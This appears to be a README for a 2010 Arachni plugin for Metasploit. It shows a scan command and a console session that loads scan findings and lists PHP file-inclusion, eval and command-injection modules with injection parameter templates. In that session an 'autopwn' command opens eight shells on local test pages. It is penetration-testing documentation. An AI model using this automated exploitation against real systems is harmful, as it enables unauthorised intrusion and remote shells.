The files under this directory are temporarily distributed via the Arachni framework
in order to assist with the development of the experimental branch.

In the future these files will most likely be incorporated into the Metasploit framework.

Installation:
$ cp -R arachni/external/metasploit/* metasploit/
    
Usage:

Execute Arachni, intructing it to create a Metareport once the scan has finished: 
$ ./arachni.rb -gpcv --mods=* http://test.com --report=metareport --repsave=myreport
    
Load Metasploit:
$ ./msfconsole 

                 o                       8         o   o                                                                                                                         
                 8                       8             8                                                                                                                         
ooYoYo. .oPYo.  o8P .oPYo. .oPYo. .oPYo. 8 .oPYo. o8  o8P                                                                                                                        
8' 8  8 8oooo8   8  .oooo8 Yb..   8    8 8 8    8  8   8                                                                                                                         
8  8  8 8.       8  8    8   'Yb. 8    8 8 8    8  8   8                                                                                                                         
8  8  8 `Yooo'   8  `YooP8 `YooP' 8YooP' 8 `YooP'  8   8                                                                                                                         
..:..:..:.....:::..::.....::.....:8.....:..:.....::..::..:                                                                                                                       
::::::::::::::::::::::::::::::::::8:::::::::::::::::::::::                                                                                                                       
::::::::::::::::::::::::::::::::::::::::::::::::::::::::::                                                                                                                       
                                                                                                                                                                                 

       =[ metasploit v3.5.1-dev [core:3.5 api:1.0]
+ -- --=[ 616 exploits - 306 auxiliary
+ -- --=[ 215 payloads - 27 encoders - 8 nops
       =[ svn r10772 updated today (2010.10.21)

msf > load arachni                                  # Load the Arachni plug-in
[*] Successfully loaded plugin: arachni
msf > arachni_load ../arachni/myreport.afr.msf      # Load the Metareport
[*] Loading report...
[*] Loaded 14 vulnerabilities.


Unique exploits
===============

    ID  Exploit                          Description
    --  -------                          -----------
    1   unix/webapp/arachni_php_include  
                    This module allows complex HTTP requests to be crafted in order to
                allow exploitation of PHP remote file inclusion vulnerabilities.
                
                Use 'XXinjectionXX' to mark the value of the vulnerable variable/field,
                i.e. where the payload should go.
                
                Supported vectors: GET, POST, COOKIE, HEADER.
                (Mainly for use with the Arachni plug-in.)
            
    2   unix/webapp/arachni_php_eval     
                    This module allows complex HTTP requests to be crafted in order to
                allow exploitation of PHP eval() vulnerabilities in Unix-like platforms.
                
                Use 'XXinjectionXX' to mark the value of the vulnerable variable/field,
                i.e. where the payload should go.
                
                Supported vectors: GET, POST, COOKIE, HEADER.
                (Mainly for use with the Arachni plug-in.)

    3   unix/webapp/arachni_exec         
                    This module allows complex HTTP requests to be crafted in order to
                allow exploitation of command injection vulnerabilities in Unix-like platforms.
                
                Use 'XXinjectionXX' to mark the value of the vulnerable variable/field,
                i.e. where the payload should go.
                
                Supported vectors: GET, POST, COOKIE, HEADER.
                (Mainly for use with the Arachni plug-in.)
            



Vulnerabilities
===============

    ID  Host       Path                                    Name                   Description                                                    Method  Params                               Exploit
    --  ----       ----                                    ----                   -----------                                                    ------  ------                               -------
    1   127.0.0.2  /~zapotek/tests/trainer.php             Remote file inclusion  A remote file inclusion vulnerability exists.                  COOKIE  {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
    2   127.0.0.2  /~zapotek/tests/trainer.php             Remote file inclusion  A remote file inclusion vulnerability exists.                  COOKIE  {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
    3   127.0.0.2  /~zapotek/tests/cookies/eval.php        Code injection         Code can be injected into the web application.                 COOKIE  {"eval"=>"%3BXXinjectionXX"}         unix/webapp/arachni_php_eval
    4   127.0.0.2  /~zapotek/tests/cookies/os_command.php  OS command injection   The web application allows an attacker to execute OS commands. COOKIE  {"os_command"=>"XXinjectionXX\x00"}  unix/webapp/arachni_exec
    5   127.0.0.2  /~zapotek/tests/cookies/os_command.php  OS command injection   The web application allows an attacker toexecute OS commands.  COOKIE  {"os_command"=>"XXinjectionXX"}      unix/webapp/arachni_exec
    6   127.0.0.2  /~zapotek/tests/cookies/rfi.php         Remote file inclusion  A remote file inclusion vulnerability exists.                  COOKIE  {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
    7   127.0.0.2  /~zapotek/tests/cookies/rfi.php         Remote file inclusion  A remote file inclusion vulnerability exists.                  COOKIE  {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
    8   127.0.0.2  /~zapotek/tests/links/rfi.php           Remote file inclusion  A remote file inclusion vulnerability exists.                  GET     {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
    9   127.0.0.2  /~zapotek/tests/links/rfi.php           Remote file inclusion  A remote file inclusion vulnerability exists.                  GET     {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
    10  127.0.0.2  /~zapotek/tests/forms/eval.php          Code injection         Code can be injected into the web application.                 POST    {"eval"=>"%3BXXinjectionXX"}         unix/webapp/arachni_php_eval
    11  127.0.0.2  /~zapotek/tests/forms/rfi.php           Remote file inclusion  A remote file inclusion vulnerability exists.                  POST    {"rfi"=>"XXinjectionXX\x00"}         unix/webapp/arachni_php_include
    12  127.0.0.2  /~zapotek/tests/forms/rfi.php           Remote file inclusion  A remote file inclusion vulnerability exists.                  POST    {"rfi"=>"XXinjectionXX"}             unix/webapp/arachni_php_include
    13  127.0.0.2  /~zapotek/tests/forms/os_command.php    OS command injection   The web application allows an attacker to execute OS commands. POST    {"os_command"=>"XXinjectionXX\x00"}  unix/webapp/arachni_exec
    14  127.0.0.2  /~zapotek/tests/forms/os_command.php    OS command injection   The web application allows an attacker to execute OS commands. POST    {"os_command"=>"XXinjectionXX"}      unix/webapp/arachni_exec



[*] Done!
msf > ?         # Let's see what the plugin provides...

Arachni Commands
================

    Command                Description
    -------                -----------
    arachni_autopwn        Tries to exploit all vulnerabilities.
    arachni_killall        Kills all running/pending pwn-jobs.
    arachni_list_all       Same as running 'arachni_list_exploits' & 'arachni_list_vulns'.
    arachni_list_exploits  Lists all matching exploit modules.
    arachni_list_vulns     Lists all vulnerabilities.
    arachni_load           Loads an ArachniMetareport file (.afr.msf).
    arachni_manual         Prepares a vulnerability for manual exploitation.

[...snip...]

msf > arachni_autopwn -a        # Let's ROCK!
[*] Running pwn-jobs...
[...snipping boring crap..]
[*] The autopwn command has completed with 8 sessions
[*] Enter sessions -i [ID] to interact with a given session ID
[*] 
[*] ================================================================================

Active sessions
===============

  Id  Type   Information  Connection                          Via
  --  ----   -----------  ----------                          ---
  1   shell               127.0.0.1:58839 -> 127.0.0.1:5905   exploit/unix/webapp/arachni_php_include
  2   shell               127.0.0.1:35403 -> 127.0.0.1:8157   exploit/unix/webapp/arachni_php_include
  3   shell               127.0.0.1:56408 -> 127.0.0.1:8487   exploit/unix/webapp/arachni_php_include
  4   shell               127.0.0.1:58112 -> 127.0.0.1:6650   exploit/unix/webapp/arachni_php_include
  5   shell               127.0.0.2:38411 -> 127.0.0.2:11364  exploit/unix/webapp/arachni_php_eval
  6   shell               127.0.0.2:45957 -> 127.0.0.2:13815  exploit/unix/webapp/arachni_exec
  7   shell               127.0.0.2:50001 -> 127.0.0.2:7373   exploit/unix/webapp/arachni_exec
  8   shell               127.0.0.1:39908 -> 127.0.0.1:6168   exploit/unix/webapp/arachni_php_include

[*] ================================================================================
msf > arachni_autopwn -h            # Autopwn gives us lots of goodies ;)
[*] Usage: arachni_autopwn [options]
        -h          Display this help text
        -x [regexp] Only run modules whose name matches the regex
        -a          Launch exploits against all matched targets
        -r          Use a reverse connect shell
        -b          Use a bind shell on a random port (default)
        -m          Use a meterpreter shell (if possible)
        -q          Disable exploit module output

msf > 
